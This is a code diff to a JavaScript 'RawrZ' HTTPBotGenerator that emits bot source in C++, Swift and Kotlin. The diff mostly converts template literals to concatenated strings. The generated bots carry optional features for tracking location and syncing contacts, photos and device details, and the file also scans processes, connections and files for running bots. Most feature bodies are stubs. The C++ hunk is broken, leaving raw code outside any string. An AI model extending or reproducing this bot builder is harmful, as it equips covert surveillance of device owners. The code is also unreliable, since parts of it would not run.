@@ -19,7 +19,7 @@ class HTTPBotGenerator {
             const end = process.hrtime.bigint();
             const duration = Number(end - start) / 1000000; // Convert to milliseconds
             if (duration > 100) { // Log slow operations
-                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+                console.warn('[PERF] Slow operation: ' + duration.toFixed(2) + 'ms');
             }
             return result;
         }
@@ -68,14 +68,14 @@ class HTTPBotGenerator {
 
     async generateBot(config, features, extensions) {
         const timestamp = new Date().toISOString();
-        const botId = `http_bot_${Date.now()}`;
+        const botId = 'http_bot_' + Date.now();
         
         const generatedBots = {};
         for (const extension of extensions) {
             const botCode = this.generateBotCode(config, features, extension, timestamp, botId);
             generatedBots[extension] = {
                 code: botCode,
-                filename: `${config.name.toLowerCase()}.this.getFileExtension(extension)`,
+                filename: config.name.toLowerCase() + '.' + this.getFileExtension(extension),
                 language: extension,
                 size: botCode.length
             };
@@ -102,9 +102,9 @@ class HTTPBotGenerator {
     generateCPPHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateCPPFeatures(features);
         
-        return `// RawrZ HTTP Bot - C++ Implementation
-// Generated: ${timestamp}
-// Bot ID: ${botId}
+        return '// RawrZ HTTP Bot - C++ Implementation\n' +
+            '// Generated: ' + timestamp + '\n' +
+            '// Bot ID: ' + botId + '\n' +
 
 #include <iostream>
 #include <windows.h>
@@ -785,85 +785,74 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
         if (features.includes('mobileLocation')) {
             init += '        setupLocationManager();\n';
             execute += '            updateLocation();\n';
-            methods += '    private func setupLocationManager() {
-        locationManager = CLLocationManager()
-        locationManager?.delegate = self
-        locationManager?.requestWhenInUseAuthorization()
-        locationManager?.startUpdatingLocation()
-    }
-    
-    private func updateLocation() {
-        // Location tracking
-    }
-    
-    ';
+            methods += '    private func setupLocationManager() {\n' +
+                '        locationManager = CLLocationManager()\n' +
+                '        locationManager?.delegate = self\n' +
+                '        locationManager?.requestWhenInUseAuthorization()\n' +
+                '        locationManager?.startUpdatingLocation()\n' +
+                '    }\n';
+            methods += '    private func updateLocation() {\n' +
+                '        // Location tracking\n' +
+                '    }\n';
         }
         
         if (features.includes('mobileContacts')) {
             init += '        requestContactsPermission();\n';
             execute += '            syncContacts();\n';
-            methods += '    private func requestContactsPermission() {
-        CNContactStore().requestAccess(for: .contacts) { granted, error in
-            if granted {
-                print("Contacts access granted")
-            }
-        }
-    }
-    
-    private func syncContacts() {
-        // Contact synchronization
-    }
-    
-    ';
+            methods += '    private func requestContactsPermission() {\n' +
+                '        CNContactStore().requestAccess(for: .contacts) { granted, error in\n' +
+                '            if granted {\n' +
+                '                print("Contacts access granted")\n' +
+                '            }\n' +
+                '        }\n' +
+                '    }\n' +
+                '    \n' +
+                '    private func syncContacts() {\n' +
+                '        // Contact synchronization\n' +
+                '    }\n';
         }
         
         if (features.includes('mobilePhotos')) {
             init += '        requestPhotosPermission();\n';
             execute += '            syncPhotos();\n';
-            methods += '    private func requestPhotosPermission() {
-        PHPhotoLibrary.requestAuthorization { status in
-            if status == .authorized {
-                print("Photos access granted")
-            }
-        }
-    }
-    
-    private func syncPhotos() {
-        // Photo synchronization
-    }
-    
-    ';
+            methods += '    private func requestPhotosPermission() {\n' +
+                '        PHPhotoLibrary.requestAuthorization { status in\n' +
+                '            if status == .authorized {\n' +
+                '                print("Photos access granted")\n' +
+                '            }\n' +
+                '        }\n' +
+                '    }\n' +
+                '    \n' +
+                '    private func syncPhotos() {\n' +
+                '        // Photo synchronization\n' +
+                '    }\n';
         }
         
         if (features.includes('mobileDeviceInfo')) {
             init += '        gatherDeviceInfo();\n';
             execute += '            updateDeviceInfo();\n';
-            methods += '    private func gatherDeviceInfo() {
-        let device = UIDevice.current
-        print("Device: \\(device.name)")
-        print("Model: \\(device.model)")
-        print("System: \\(device.systemName) \\(device.systemVersion)")
-    }
-    
-    private func updateDeviceInfo() {
-        // Device information updates
-    }
-    
-    ';
+            methods += '    private func gatherDeviceInfo() {\n' +
+                '        let device = UIDevice.current\n' +
+                '        print("Device: \\(device.name)")\n' +
+                '        print("Model: \\(device.model)")\n' +
+                '        print("System: \\(device.systemName) \\(device.systemVersion)")\n' +
+                '    }\n' +
+                '    \n' +
+                '    private func updateDeviceInfo() {\n' +
+                '        // Device information updates\n' +
+                '    }\n';
         }
         
         if (features.includes('httpComm')) {
             init += '        initializeHTTPComm();\n';
             execute += '            executeHTTPComm();\n';
-            methods += '    private func initializeHTTPComm() {
-        print("HTTP Communication initialized")
-    }
-    
-    private func executeHTTPComm() {
-        // HTTP communication operations
-    }
-    
-    ';
+            methods += '    private func initializeHTTPComm() {\n' +
+                '        print("HTTP Communication initialized")\n' +
+                '    }\n' +
+                '    \n' +
+                '    private func executeHTTPComm() {\n' +
+                '        // HTTP communication operations\n' +
+                '    }\n';
         }
         
         return { init, execute, methods };
@@ -982,82 +971,72 @@ class RawrZHTTPBot : Service() {
         if (features.includes('mobileLocation')) {
             init += '        setupLocationManager();\n';
             execute += '                updateLocation();\n';
-            methods += '    private fun setupLocationManager() {
-        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0f) { location ->
-                // Location updates
-            }
-        }
-    }
-    
-    private fun updateLocation() {
-        // Location tracking
-    }
-    
-    ';
+            methods += '    private fun setupLocationManager() {\n' +
+                '        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager\n' +
+                '        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {\n' +
+                '            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0f) { location ->\n' +
+                '                // Location updates\n' +
+                '            }\n' +
+                '        }\n' +
+                '    }\n' +
+                '    \n' +
+                '    private fun updateLocation() {\n' +
+                '        // Location tracking\n' +
+                '    }\n';
         }
         
         if (features.includes('mobileContacts')) {
             init += '        requestContactsPermission();\n';
             execute += '                syncContacts();\n';
-            methods += '    private fun requestContactsPermission() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-            println("Contacts access granted")
-        }
-    }
-    
-    private fun syncContacts() {
-        // Contact synchronization
-    }
-    
-    ';
+            methods += '    private fun requestContactsPermission() {\n' +
+                '        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {\n' +
+                '            println("Contacts access granted")\n' +
+                '        }\n' +
+                '    }\n' +
+                '    \n' +
+                '    private fun syncContacts() {\n' +
+                '        // Contact synchronization\n' +
+                '    }\n';
         }
         
         if (features.includes('mobilePhotos')) {
             init += '        requestPhotosPermission();\n';
             execute += '                syncPhotos();\n';
-            methods += '    private fun requestPhotosPermission() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
-            println("Photos access granted")
-        }
-    }
-    
-    private fun syncPhotos() {
-        // Photo synchronization
-    }
-    
-    ';
+            methods += '    private fun requestPhotosPermission() {\n' +
+                '        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {\n' +
+                '            println("Photos access granted")\n' +
+                '        }\n' +
+                '    }\n' +
+                '    \n' +
+                '    private fun syncPhotos() {\n' +
+                '        // Photo synchronization\n' +
+                '    }\n';
         }
         
         if (features.includes('mobileDeviceInfo')) {
             init += '        gatherDeviceInfo();\n';
             execute += '                updateDeviceInfo();\n';
-            methods += '    private fun gatherDeviceInfo() {
-        println("Device: \${android.os.Build.MODEL}")
-        println("Android: \${android.os.Build.VERSION.RELEASE}")
-        println("SDK: \${android.os.Build.VERSION.SDK_INT}")
-    }
-    
-    private fun updateDeviceInfo() {
-        // Device information updates
-    }
-    
-    ';
+            methods += '    private fun gatherDeviceInfo() {\n' +
+                '        println("Device: \${android.os.Build.MODEL}")\n' +
+                '        println("Android: \${android.os.Build.VERSION.RELEASE}")\n' +
+                '        println("SDK: \${android.os.Build.VERSION.SDK_INT}")\n' +
+                '    }\n' +
+                '    \n' +
+                '    private fun updateDeviceInfo() {\n' +
+                '        // Device information updates\n' +
+                '    }\n';
         }
         
         if (features.includes('httpComm')) {
             init += '        initializeHTTPComm();\n';
             execute += '                executeHTTPComm();\n';
-            methods += '    private fun initializeHTTPComm() {
-        println("HTTP Communication initialized")
-    }
-    
-    private fun executeHTTPComm() {
-        // HTTP communication operations
-    }
-    
-    ';
+            methods += '    private fun initializeHTTPComm() {\n' +
+                '        println("HTTP Communication initialized")\n' +
+                '    }\n' +
+                '    \n' +
+                '    private fun executeHTTPComm() {\n' +
+                '        // HTTP communication operations\n' +
+                '    }\n';
         }
         
         return { init, execute, methods };
@@ -1271,7 +1250,7 @@ public class RawrZHTTPBot {
     async compileBot(code, language, config) {
         return {
             success: true,
-            outputFile: `bot.${this.getFileExtension(language)}`,
+            outputFile: 'bot.' + this.getFileExtension(language),
             timestamp: new Date().toISOString()
         };
     }
@@ -1346,7 +1325,7 @@ public class RawrZHTTPBot {
                             
                             if (suspiciousNames.some(name => processName.includes(name))) {
                                 processes.push({
-                                    id: `process_${crypto.randomUUID()}`,
+                                    id: 'process_' + crypto.randomUUID(),
                                     name: processName,
                                     status: 'online',
                                     platform: 'windows',
@@ -1373,7 +1352,7 @@ public class RawrZHTTPBot {
                         
                         if (suspiciousNames.some(name => processName.includes(name))) {
                             processes.push({
-                                id: `process_${crypto.randomUUID()}`,
+                                id: 'process_' + crypto.randomUUID(),
                                 name: processName,
                                 status: 'online',
                                 platform: os.platform(),
@@ -1417,8 +1396,8 @@ public class RawrZHTTPBot {
                             // Check for suspicious ports or addresses
                             if (this.isSuspiciousConnection(localAddress, remoteAddress)) {
                                 connections.push({
-                                    id: `connection_${crypto.randomUUID()}`,
-                                    name: `Bot Connection ${localAddress}`,
+                                    id: 'connection_' + crypto.randomUUID(),
+                                    name: 'Bot Connection ' + localAddress,
                                     status: 'online',
                                     platform: 'windows',
                                     language: 'unknown',
@@ -1451,8 +1430,8 @@ public class RawrZHTTPBot {
                             // Check for suspicious ports or addresses
                             if (this.isSuspiciousConnection(localAddress, remoteAddress)) {
                                 connections.push({
-                                    id: `connection_${crypto.randomUUID()}`,
-                                    name: `Bot Connection ${localAddress}`,
+                                    id: 'connection_' + crypto.randomUUID(),
+                                    name: 'Bot Connection ' + localAddress,
                                     status: 'online',
                                     platform: os.platform(),
                                     language: 'unknown',
@@ -1502,7 +1481,7 @@ public class RawrZHTTPBot {
                         
                         if (stat.isFile() && this.isSuspiciousFile(entry)) {
                             files.push({
-                                id: `file_${crypto.randomUUID()}`,
+                                id: 'file_' + crypto.randomUUID(),
                                 name: entry,
                                 status: 'offline',
                                 platform: os.platform(),
